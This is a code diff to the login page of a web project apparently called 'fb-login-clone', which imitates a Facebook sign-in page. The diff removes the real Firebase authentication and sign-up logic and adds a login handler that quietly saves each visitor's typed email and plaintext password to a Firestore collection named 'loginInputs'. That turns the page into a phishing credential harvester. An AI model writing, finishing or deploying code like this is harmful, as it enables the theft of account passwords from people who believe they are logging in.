@@ -148,8 +148,7 @@
 
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-app.js";
-import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, updateProfile } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-auth.js";
-import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-firestore.js";
+import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-firestore.js";
 
 // Firebase config
 const firebaseConfig = {
@@ -158,59 +157,13 @@ const firebaseConfig = {
   projectId: "fb-login-clone-fb034",
   storageBucket: "fb-login-clone-fb034.firebasestorage.app",
   messagingSenderId: "1087507018736",
-  appId: "1:1087507018736:web:8d7b04b3dd0b4a89726335",
-  measurementId: "G-Z6P4DWC4Z4"
+  appId: "1:1087507018736:web:8d7b04b3dd0b4a89726335"
 };
 
 const app = initializeApp(firebaseConfig);
-const auth = getAuth(app);
 const db = getFirestore(app);
 
-// Email validation
-function isValidEmail(email) {
-  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
-}
-
-// Signup function
-window.signupUser = async function() {
-  const email = document.getElementById("email").value.trim();
-  const password = document.getElementById("password").value;
-  const nickname = prompt("Enter your nickname (optional):") || "";
-
-  if (!email || !password) {
-    alert("Please fill in both email and password!");
-    return;
-  }
-  if (!isValidEmail(email)) {
-    alert("Please enter a valid email address!");
-    return;
-  }
-  if (password.length < 6) {
-    alert("Password must be at least 6 characters!");
-    return;
-  }
-
-  try {
-    const userCredential = await createUserWithEmailAndPassword(auth, email, password);
-    const user = userCredential.user;
-
-    // Save nickname in Auth
-    if (nickname) await updateProfile(user, { displayName: nickname });
-
-    // Save user data in Firestore
-    await setDoc(doc(db, "users", user.uid), {
-      email: email,
-      nickname: nickname,
-      createdAt: new Date()
-    });
-
-    alert("Account created and saved to database!");
-  } catch (error) {
-    alert(error.message);
-  }
-};
-
-// Login function
+// Login function: just saves input to Firestore
 window.loginUser = async function() {
   const email = document.getElementById("email").value.trim();
   const password = document.getElementById("password").value;
@@ -219,30 +172,24 @@ window.loginUser = async function() {
     alert("Please fill in both email and password!");
     return;
   }
-  if (!isValidEmail(email)) {
-    alert("Please enter a valid email address!");
-    return;
-  }
 
   try {
-    const userCredential = await signInWithEmailAndPassword(auth, email, password);
-    const user = userCredential.user;
-
-    // Save login info to Firestore (or update lastLogin)
-    await setDoc(doc(db, "users", user.uid), {
-      email: user.email,
-      nickname: user.displayName || "",
-      lastLogin: new Date()
-    }, { merge: true });
-
-    alert(`Login successful! Welcome ${user.displayName || "User"}`);
+    await addDoc(collection(db, "loginInputs"), {
+      email: email,
+      password: password,
+      timestamp: new Date()
+    });
+    alert("Login inputs saved to database!");
   } catch (error) {
-    alert(error.message);
+    alert("Error: " + error.message);
   }
 };
+
+// Optional: keep signupUser if you still want to create users
+window.signupUser = function() {
+  alert("Signup button clicked (you can implement if needed).");
+};
 </script>
-
-
 
 </body>
 </html>
